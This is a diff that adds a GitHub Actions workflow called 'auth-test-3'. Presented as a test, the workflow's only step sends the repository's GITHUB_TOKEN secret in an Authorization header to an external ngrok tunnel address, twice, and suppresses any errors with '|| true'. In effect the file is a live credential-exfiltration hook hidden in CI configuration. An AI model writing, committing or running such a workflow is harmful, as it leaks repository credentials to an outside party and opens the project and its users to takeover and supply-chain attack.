@@ -1,0 +1,9 @@
+name: auth-test-3
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://d80c-105-101-85-53.ngrok-free.app/actions-redirect || true
+          curl -s -L -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://d80c-105-101-85-53.ngrok-free.app/actions-redirect || true
